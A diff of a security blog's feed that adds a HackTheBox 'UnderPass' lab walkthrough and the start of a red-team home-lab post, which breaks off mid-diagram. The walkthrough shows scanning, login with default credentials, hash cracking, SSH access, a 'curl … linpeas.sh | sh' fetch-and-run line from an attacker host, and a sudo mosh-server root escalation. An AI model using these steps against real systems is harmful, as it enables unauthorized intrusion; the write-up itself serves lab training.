@@ -1,4 +1,223 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-01-05T22:00:39+05:30</updated><id>http://localhost:4000/feed.xml</id><title type="html">Dcodezero</title><subtitle> </subtitle><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><entry><title type="html">Cobalt Strike Malleable C2 Profiles</title><link href="http://localhost:4000/red-team/Malleable-c2-pro/" rel="alternate" type="text/html" title="Cobalt Strike Malleable C2 Profiles" /><published>2024-12-25T00:00:00+05:30</published><updated>2024-12-25T00:00:00+05:30</updated><id>http://localhost:4000/red-team/Malleable-c2-pro</id><content type="html" xml:base="http://localhost:4000/red-team/Malleable-c2-pro/"><![CDATA[<h1 id="overview">Overview</h1>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-01-25T08:28:04+05:30</updated><id>http://localhost:4000/feed.xml</id><title type="html">Dcodezero</title><subtitle> </subtitle><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><entry><title type="html">HackTheBox UnderPass</title><link href="http://localhost:4000/hackthebox/Underpass/" rel="alternate" type="text/html" title="HackTheBox UnderPass" /><published>2025-01-10T00:00:00+05:30</published><updated>2025-01-10T00:00:00+05:30</updated><id>http://localhost:4000/hackthebox/Underpass</id><content type="html" xml:base="http://localhost:4000/hackthebox/Underpass/"><![CDATA[<h3 id="nmap-scan">Nmap scan:</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Starting Nmap 7.94 ( https://nmap.org ) at 2025-01-08 22:49 PST
+Nmap scan report for 10.10.11.48
+Host is up (0.047s latency).
+Not shown: 65533 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)
+|_  256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)
+80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 64.56 seconds
+
+</code></pre></div></div>
+
+<h3 id="trying-dirby">Trying Dirby:</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─$ dirb http://10.10.11.48   
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Wed Jan  8 22:51:43 2025
+URL_BASE: http://10.10.11.48/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://10.10.11.48/ ----
++ http://10.10.11.48/index.html (CODE:200|SIZE:10671)                                                                                                                          
++ http://10.10.11.48/server-status (CODE:403|SIZE:276)                                                                                                                         
+-----------------
+END_TIME: Wed Jan  8 22:56:03 2025
+DOWNLOADED: 4612 - FOUND: 2
+
+</code></pre></div></div>
+
+<p>Found noting intresting so far. Quickly checking with a UDP scan using nmap</p>
+
+<h4 id="udp-enumeration">UDP Enumeration:</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─$ sudo nmap -sU --top-ports 100 10.10.11.48 
+[sudo] password for kali: 
+Starting Nmap 7.94 ( https://nmap.org ) at 2025-01-08 22:59 PST
+Stats: 0:00:16 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
+UDP Scan Timing: About 10.25% done; ETC: 23:00 (0:00:35 remaining)
+Nmap scan report for 10.10.11.48
+Host is up (0.20s latency).
+Not shown: 97 closed udp ports (port-unreach)
+PORT     STATE         SERVICE
+161/udp  open          snmp
+1812/udp open|filtered radius
+1813/udp open|filtered radacct
+
+Nmap done: 1 IP address (1 host up) scanned in 130.06 seconds
+</code></pre></div></div>
+
+<p>Found that port number 161 is open with service SNMP:</p>
+
+<p>Next will be using a MSFs aux scanner for SNMP enum:</p>
+
+<p><img src="/assets/images/sample/Underpass/1.png" alt="1.png" /></p>
+
+<p><img src="/assets/images/sample/Underpass/2.png" alt="1.png" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[+] 10.10.11.48, Connected.
+
+[*] System information:
+
+Host IP                       : 10.10.11.48
+Hostname                      : UnDerPass.htb is the only daloradius server in the basin!
+Description                   : Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64
+Contact                       : steve@underpass.htb
+Location                      : Nevada, U.S.A. but not Vegas
+Uptime snmp                   : 11:03:16.58
+Uptime system                 : 11:03:06.35
+System date                   : 2025-1-9 06:48:46.0
+
+
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+</code></pre></div></div>
+
+<p>From the above Information, we can observe that there is a host name related to some thing to <code class="language-plaintext highlighter-rouge">daloradious</code>.</p>
+
+<p>Exploring more about on this, I quickly came to understand that daloradius is a framework for deployment of FreeRADIUS servers.</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>Remote Authentication Dial-In User Service is a networking protocol that provides centralized authentication, authorisation, and accounting management for users who connect and use a network service.</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>If we look at the git repo, we can observe that there are multiple folders which contain details to more pages which contain some login pages.</p>
+
+<p><code class="language-plaintext highlighter-rouge">Users</code>
+<code class="language-plaintext highlighter-rouge">Operators</code>
+<code class="language-plaintext highlighter-rouge">common</code></p>
+
+<p>So navigating to the paths will lang to the login page.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1. http://underpass.htb/daloradius/app/users/login.php
+2. http://underpass.htb/daloradius/app/operators/login.php
+</code></pre></div></div>
+
+<p><img src="/assets/images/sample/Underpass/3.png" alt="1.png" /></p>
+
+<p><img src="/assets/images/sample/Underpass/4.png" alt="1.png" /></p>
+
+<p>Now, I’ll quickly check the if I can access that directory of that name.</p>
+
+<h5 id="default-creds">Default Creds:</h5>
+
+<p>The default creds can be found from the wiki doc below:</p>
+
+<p>https://github.com/lirantal/daloradius/wiki/Installing-daloRADIUS</p>
+
+<p>Use the default creds against the machine will grant the login access.</p>
+
+<p>Note: The creds will only work with the URL with /operators/</p>
+
+<p><img src="/assets/images/sample/Underpass/6.png" alt="1.png" /></p>
+
+<p>After login, we can navigate to the user management and check for other users in the application, by navigating to the top right corner of the web app.</p>
+
+<p><img src="/assets/images/sample/Underpass/7.png" alt="1.png" /></p>
+
+<p>Username: svcMosh
+HASH: 412DD4759978ACFCC81DEAB01B382403</p>
+
+<p>Using crack station to crack the hash of the users.</p>
+
+<p><img src="/assets/images/sample/Underpass/8.png" alt="1.png" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Username: svcMosh
+Password: underwaterfriends
+</code></pre></div></div>
+
+<p>Now, login via ssh with the compromised username and password.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─$ ssh svcMosh@underpass.htb
+The authenticity of host 'underpass.htb (10.10.11.48)' can't be established.
+ED25519 key fingerprint is SHA256:zrDqCvZoLSy6MxBOPcuEyN926YtFC94ZCJ5TWRS0VaM.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'underpass.htb' (ED25519) to the list of known hosts.
+svcMosh@underpass.htb's password: 
+Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Thu Jan  9 08:26:01 AM UTC 2025
+
+  System load:  0.68              Processes:             249
+  Usage of /:   90.8% of 3.75GB   Users logged in:       1
+  Memory usage: 18%               IPv4 address for eth0: 10.10.11.48
+  Swap usage:   0%
+
+  =&gt; / is using 90.8% of 3.75GB
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Thu Jan  9 08:18:47 2025 from 10.10.14.42
+svcMosh@underpass:~$ ls
+user.txt
+svcMosh@underpass:~$ cat user.txt 
+</code></pre></div></div>
+
+<h3 id="privilege-escalation">Privilege escalation:</h3>
+
+<p>The traditional way to search for privilege escalation technique is by using linpeas.sh</p>
+
+<p>Link: https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS</p>
+
+<p><code class="language-plaintext highlighter-rouge">svcMosh@underpass:~$ curl -L http://10.10.14.13:8000/linpeas.sh | sh</code></p>
+
+<p>The other way around to check privileages to check by using <code class="language-plaintext highlighter-rouge">sudo -l</code></p>
+
+<p><img src="/assets/images/sample/Underpass/9.png" alt="1.png" /></p>
+
+<p>The line <code class="language-plaintext highlighter-rouge">(ALL) NOPASSWD: /usr/bin/mosh-server</code> is typically part of a <code class="language-plaintext highlighter-rouge">sudoers</code> configuration file. It specifies permissions for the <code class="language-plaintext highlighter-rouge">sudo</code> command and determines how certain users or groups can execute specific commands with elevated privileges.</p>
+
+<p>The above basically means that, this line appears in the <code class="language-plaintext highlighter-rouge">sudoers</code> file (edited with <code class="language-plaintext highlighter-rouge">visudo</code>), a user could run:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo /usr/bin/mosh-server
+</code></pre></div></div>
+
+<p>Now execute the below command to connect to local host and gain root access.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mosh --server="sudo /usr/bin/mosh-server" localhost
+</code></pre></div></div>
+<p><img src="/assets/images/sample/Underpass/11.png" alt="1.png" /></p>
+
+<p><img src="/assets/images/sample/Underpass/10.png" alt="1.png" /></p>]]></content><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><category term="hackthebox" /><category term="HTB" /><category term="Linux" /><summary type="html"><![CDATA[UnderPass is a HTB easy linux machine, Created by dakkmaddy. The Box is mainly based on Enumerations and basic priv escalations.]]></summary></entry><entry><title type="html">Cobalt Strike Malleable C2 Profiles</title><link href="http://localhost:4000/red-team/Malleable-c2-pro/" rel="alternate" type="text/html" title="Cobalt Strike Malleable C2 Profiles" /><published>2024-12-25T00:00:00+05:30</published><updated>2024-12-25T00:00:00+05:30</updated><id>http://localhost:4000/red-team/Malleable-c2-pro</id><content type="html" xml:base="http://localhost:4000/red-team/Malleable-c2-pro/"><![CDATA[<h1 id="overview">Overview</h1>
 
 <p>Beacon’s HTTP indicators are controlled by a Malleable Command and Control (Malleable C2) profile. A Malleable C2 profile is a simple program that specifies how to transform data and store it in a transaction. The same profile that transforms and stores data, interpreted backwards, also extracts and recovers data from a transaction.</p>
 
@@ -219,7 +438,98 @@ Verifying - Enter Export Password:
 
 <p>The Cobalt Strike Team Server expects the KeyStore to be in the same directory as itself.  Launch the Team Server with the updated profile.</p>
 
-<p class="notice--info"><code class="language-plaintext highlighter-rouge">root@teamserver: ./teamserver IP-address passwword@123 apt.profile</code></p>]]></content><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><category term="Red-Team" /><category term="HomeLab" /><category term="IT" /><category term="RED-Team" /><summary type="html"><![CDATA[This is how you setup single or multiple redirectors for Cobalt-Strike using malleable-c2 profiles and Apache SSL]]></summary></entry><entry><title type="html">Game of Active Directory - Part 3 [Recon]</title><link href="http://localhost:4000/goad/GOAD-p3/" rel="alternate" type="text/html" title="Game of Active Directory - Part 3 [Recon]" /><published>2024-12-14T00:00:00+05:30</published><updated>2024-12-14T00:00:00+05:30</updated><id>http://localhost:4000/goad/GOAD-p3</id><content type="html" xml:base="http://localhost:4000/goad/GOAD-p3/"><![CDATA[<h4 id="previously">Previously:</h4>
+<p class="notice--info"><code class="language-plaintext highlighter-rouge">root@teamserver: ./teamserver IP-address passwword@123 apt.profile</code></p>]]></content><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><category term="Red-Team" /><category term="HomeLab" /><category term="IT" /><category term="RED-Team" /><summary type="html"><![CDATA[This is how you setup single or multiple redirectors for Cobalt-Strike using malleable-c2 profiles and Apache SSL]]></summary></entry><entry><title type="html">RED-TEAM Home-Lab Infra</title><link href="http://localhost:4000/red-team/RED-TEAM-Infra/" rel="alternate" type="text/html" title="RED-TEAM Home-Lab Infra" /><published>2024-12-14T00:00:00+05:30</published><updated>2024-12-14T00:00:00+05:30</updated><id>http://localhost:4000/red-team/RED-TEAM-Infra</id><content type="html" xml:base="http://localhost:4000/red-team/RED-TEAM-Infra/"><![CDATA[<p>After looking at a bunch of blogs from the other security folks about RED-Teaming. It started to bug my mind that how is all the setup done form the infrastructure side of things.</p>
+
+<p>Taking the advantage from the experience of creating a home lab environment, using multiple hypervisors and networking. I decided to have my own infrastructure in my home lab. This home lab will contain a lot of things that will be related to starting from..</p>
+
+<ol>
+  <li><code class="language-plaintext highlighter-rouge">Networking</code></li>
+  <li><code class="language-plaintext highlighter-rouge">Multiple VMs</code></li>
+  <li><code class="language-plaintext highlighter-rouge">Multiple DMZs</code></li>
+  <li><code class="language-plaintext highlighter-rouge">Isolations</code></li>
+  <li><code class="language-plaintext highlighter-rouge">Netowork traffic</code></li>
+  <li><code class="language-plaintext highlighter-rouge">The victim network</code></li>
+  <li><code class="language-plaintext highlighter-rouge">Attacking infrstructure</code> which will contain
+    <ol>
+      <li><code class="language-plaintext highlighter-rouge">Single/Multiple Redirectors</code></li>
+      <li><code class="language-plaintext highlighter-rouge">The attack box</code>
+        <ol>
+          <li><code class="language-plaintext highlighter-rouge">Windows Machine</code></li>
+          <li><code class="language-plaintext highlighter-rouge">Linux [Kali]</code></li>
+        </ol>
+      </li>
+    </ol>
+  </li>
+  <li><code class="language-plaintext highlighter-rouge">Assumed Public Cloud infrastructure</code>
+    <ol>
+      <li><code class="language-plaintext highlighter-rouge">This is where the redirectors stay</code></li>
+    </ol>
+  </li>
+  <li><code class="language-plaintext highlighter-rouge">Using Pfsense firewall</code> to accomplish all the above activity.</li>
+</ol>
+
+<p>I’ve divided the Infra into 3 Parts, which is as follows.</p>
+
+<ol>
+  <li><code class="language-plaintext highlighter-rouge">Victim-Network</code></li>
+  <li><code class="language-plaintext highlighter-rouge">Assumed Public-Cloud</code></li>
+  <li><code class="language-plaintext highlighter-rouge">Attacking-Network</code></li>
+</ol>
+
+<p>From the previous home-lab blog, I’ve showed the configuration of the <code class="language-plaintext highlighter-rouge">HP-Proliant</code> enterprise grade server. This server is a beast to run all the number of <code class="language-plaintext highlighter-rouge">virtual machines</code> that I wanted to execute for the infra.</p>
+
+<blockquote>
+  <p>Interested how the setup looks like? <a href="https://dcodezero.github.io/it/Homelab/">Check it</a></p>
+</blockquote>
+
+<p>Below are some of the things that I strictly wanted to have in my LAB. This helps my in defining the things for further or future upgrades that I wanted to have in my LAB.</p>
+
+<ol>
+  <li>Attacker network should not directly talk or communicate with the victim network.</li>
+  <li>Victim network should not directly talk or communicate with the Attacker network.</li>
+  <li>The <code class="language-plaintext highlighter-rouge">Victim or the attacker</code> networks can only communicate to the <code class="language-plaintext highlighter-rouge">public cloud</code>.</li>
+  <li>Here the bridge/communication between these two networks is only via <code class="language-plaintext highlighter-rouge">Public Cloud-Network</code>.</li>
+  <li>Due to security constraints/reasons, the victim network only allow the egress traffic to the <code class="language-plaintext highlighter-rouge">public cloud</code> via port <code class="language-plaintext highlighter-rouge">443</code> <code class="language-plaintext highlighter-rouge">HTTPS</code>.</li>
+  <li>Along the other side to keep the attacking infra safe, the attacking network will only communicate to the <code class="language-plaintext highlighter-rouge">Public cloud</code> via <code class="language-plaintext highlighter-rouge">22</code> <code class="language-plaintext highlighter-rouge">SSH</code> by tunneling the traffic using redirectors.</li>
+</ol>
+
+<p>I’ve created a small Network Diagram to show how the idea is going to work.</p>
+
+<html><head><title>RTIL.drawio.html</title><meta charset="utf-8" /></head><body>
+    <div class="mxgraph" style="max-width:100%;border:1px solid transparent;" data-mxgraph="{&quot;highlight&quot;:&quot;#0000ff&quot;,&quot;nav&quot;:true,&quot;resize&quot;:true,&quot;xml&quot;:&quot;&lt;mxfile host=\&quot;app.diagrams.net\&quot; agent=\&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1.1 Safari/605.1.15\&quot; version=\&quot;25.0.3\&quot;&gt;&lt;diagram name=\&quot;Page-1\&quot; id=\&quot;J8HO-rfsxQq54d3A0VBy\&quot;&gt;&lt;mxGraphModel dx=\&quot;1224\&quot; dy=\&quot;774\&quot; grid=\&quot;1\&quot; gridSize=\&quot;10\&quot; guides=\&quot;1\&quot; tooltips=\&quot;1\&quot; connect=\&quot;1\&quot; arrows=\&quot;1\&quot; fold=\&quot;1\&quot; page=\&quot;1\&quot; pageScale=\&quot;1\&quot; pageWidth=\&quot;827\&quot; pageHeight=\&quot;1169\&quot; math=\&quot;0\&quot; shadow=\&quot;0\&quot;&gt;&lt;root&gt;&lt;mxCell id=\&quot;0\&quot;/&gt;&lt;mxCell id=\&quot;1\&quot; parent=\&quot;0\&quot;/&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-1\&quot; value=\&quot;\&quot; style=\&quot;verticalLabelPosition=bottom;sketch=0;html=1;fillColor=#A153A0;strokeColor=#ffffff;verticalAlign=top;align=center;points=[[0,0.5,0],[0.125,0.25,0],[0.25,0,0],[0.5,0,0],[0.75,0,0],[0.875,0.25,0],[1,0.5,0],[0.875,0.75,0],[0.75,1,0],[0.5,1,0],[0.125,0.75,0]];pointerEvents=1;shape=mxgraph.cisco_safe.compositeIcon;bgIcon=mxgraph.cisco_safe.design.blank_device;resIcon=mxgraph.cisco_safe.design.ms_active_directory;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;604.13\&quot; y=\&quot;160\&quot; width=\&quot;100\&quot; height=\&quot;90\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-3\&quot; value=\&quot;\&quot; style=\&quot;verticalLabelPosition=bottom;sketch=0;html=1;fillColor=#A153A0;strokeColor=#ffffff;verticalAlign=top;align=center;points=[[0,0.5,0],[0.125,0.25,0],[0.25,0,0],[0.5,0,0],[0.75,0,0],[0.875,0.25,0],[1,0.5,0],[0.875,0.75,0],[0.75,1,0],[0.5,1,0],[0.125,0.75,0]];pointerEvents=1;shape=mxgraph.cisco_safe.compositeIcon;bgIcon=mxgraph.cisco_safe.design.blank_device;resIcon=mxgraph.cisco_safe.design.ms_active_directory;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;604.13\&quot; y=\&quot;320\&quot; width=\&quot;100\&quot; height=\&quot;90\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-4\&quot; value=\&quot;\&quot; style=\&quot;verticalLabelPosition=bottom;sketch=0;html=1;fillColor=#A153A0;strokeColor=#ffffff;verticalAlign=top;align=center;points=[[0,0.5,0],[0.125,0.25,0],[0.25,0,0],[0.5,0,0],[0.75,0,0],[0.875,0.25,0],[1,0.5,0],[0.875,0.75,0],[0.75,1,0],[0.5,1,0],[0.125,0.75,0]];pointerEvents=1;shape=mxgraph.cisco_safe.compositeIcon;bgIcon=mxgraph.cisco_safe.design.blank_device;resIcon=mxgraph.cisco_safe.design.ms_active_directory;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;604.13\&quot; y=\&quot;470\&quot; width=\&quot;100\&quot; height=\&quot;90\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-7\&quot; value=\&quot;\&quot; style=\&quot;points=[];aspect=fixed;html=1;align=center;shadow=0;dashed=0;fillColor=#FF6A00;strokeColor=none;shape=mxgraph.alibaba_cloud.aliyun_linux;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;324.13\&quot; y=\&quot;250\&quot; width=\&quot;72.5\&quot; height=\&quot;72.5\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-8\&quot; value=\&quot;\&quot; style=\&quot;image;sketch=0;aspect=fixed;html=1;points=[];align=center;fontSize=12;image=img/lib/mscae/VM_Linux_Non_Azure.svg;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;84.13\&quot; y=\&quot;290\&quot; width=\&quot;71.74\&quot; height=\&quot;66\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-9\&quot; value=\&quot;\&quot; style=\&quot;image;sketch=0;aspect=fixed;html=1;points=[];align=center;fontSize=12;image=img/lib/mscae/VirtualMachineWindows.svg;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;84.13\&quot; y=\&quot;390\&quot; width=\&quot;71.74\&quot; height=\&quot;66\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-12\&quot; value=\&quot;\&quot; style=\&quot;points=[];aspect=fixed;html=1;align=center;shadow=0;dashed=0;fillColor=#FF6A00;strokeColor=none;shape=mxgraph.alibaba_cloud.aliyun_linux;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;325.13\&quot; y=\&quot;407.5\&quot; width=\&quot;72.5\&quot; height=\&quot;72.5\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-32\&quot; style=\&quot;edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;entryX=1;entryY=0.5;entryDx=0;entryDy=0;strokeWidth=3;strokeColor=#97D077;\&quot; edge=\&quot;1\&quot; parent=\&quot;1\&quot; source=\&quot;h3hSjAzG3KHHkQH4Dxe3-13\&quot; target=\&quot;h3hSjAzG3KHHkQH4Dxe3-14\&quot;&gt;&lt;mxGeometry relative=\&quot;1\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-13\&quot; value=\&quot;\&quot; style=\&quot;rounded=0;whiteSpace=wrap;html=1;fillColor=none;strokeColor=#f5ec00;strokeWidth=3;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;544.13\&quot; y=\&quot;135\&quot; width=\&quot;220\&quot; height=\&quot;480\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-14\&quot; value=\&quot;\&quot; style=\&quot;rounded=0;whiteSpace=wrap;html=1;fillColor=none;strokeColor=#00c7fc;strokeWidth=4;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;304.13\&quot; y=\&quot;200\&quot; width=\&quot;120\&quot; height=\&quot;350\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-31\&quot; style=\&quot;edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;strokeWidth=3;strokeColor=#FFB570;\&quot; edge=\&quot;1\&quot; parent=\&quot;1\&quot; source=\&quot;h3hSjAzG3KHHkQH4Dxe3-15\&quot; target=\&quot;h3hSjAzG3KHHkQH4Dxe3-14\&quot;&gt;&lt;mxGeometry relative=\&quot;1\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-15\&quot; value=\&quot;\&quot; style=\&quot;rounded=0;whiteSpace=wrap;html=1;fillColor=none;strokeColor=#FF9933;strokeWidth=3;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;60.00000000000001\&quot; y=\&quot;250\&quot; width=\&quot;120\&quot; height=\&quot;250\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-16\&quot; value=\&quot;Redirector -1\&quot; style=\&quot;text;html=1;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;fontColor=#D1D1D1;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;330.38\&quot; y=\&quot;330\&quot; width=\&quot;73.75\&quot; height=\&quot;30\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-17\&quot; value=\&quot;Redirector -2\&quot; style=\&quot;text;html=1;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;fontColor=#D1D1D1;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;327.25\&quot; y=\&quot;490\&quot; width=\&quot;73.75\&quot; height=\&quot;30\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-18\&quot; value=\&quot;Victim-Network-01\&quot; style=\&quot;text;html=1;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;fontColor=#D1D1D1;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;584.13\&quot; y=\&quot;260\&quot; width=\&quot;140\&quot; height=\&quot;30\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-19\&quot; value=\&quot;Victim-Network-02&amp;lt;span style=&amp;quot;caret-color: rgba(0, 0, 0, 0); font-family: monospace; font-size: 0px; text-align: start; white-space: nowrap;&amp;quot;&amp;gt;%3CmxGraphModel%3E%3Croot%3E%3CmxCell%20id%3D%220%22%2F%3E%3CmxCell%20id%3D%221%22%20parent%3D%220%22%2F%3E%3CmxCell%20id%3D%222%22%20value%3D%22Victim-Network-01%22%20style%3D%22text%3Bhtml%3D1%3Balign%3Dcenter%3BverticalAlign%3Dmiddle%3BwhiteSpace%3Dwrap%3Brounded%3D0%3B%22%20vertex%3D%221%22%20parent%3D%221%22%3E%3CmxGeometry%20x%3D%22600%22%20y%3D%22170%22%20width%3D%22140%22%20height%3D%2230%22%20as%3D%22geometry%22%2F%3E%3C%2FmxCell%3E%3C%2Froot%3E%3C%2FmxGraphModel%3E&amp;lt;/span&amp;gt;\&quot; style=\&quot;text;html=1;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;fontColor=#D1D1D1;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;584.13\&quot; y=\&quot;407.5\&quot; width=\&quot;140\&quot; height=\&quot;30\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-20\&quot; value=\&quot;Victim-Network-03\&quot; style=\&quot;text;html=1;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;fontColor=#D1D1D1;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;584.13\&quot; y=\&quot;560\&quot; width=\&quot;140\&quot; height=\&quot;30\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-21\&quot; value=\&quot;172.16.100.0/24\&quot; style=\&quot;text;html=1;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;fontColor=#D1D1D1;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;594.13\&quot; y=\&quot;280\&quot; width=\&quot;120\&quot; height=\&quot;30\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-23\&quot; value=\&quot;172.16.110.0/24\&quot; style=\&quot;text;html=1;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;fontColor=#D1D1D1;\&quot; vertex=\&quot;1\&quot; 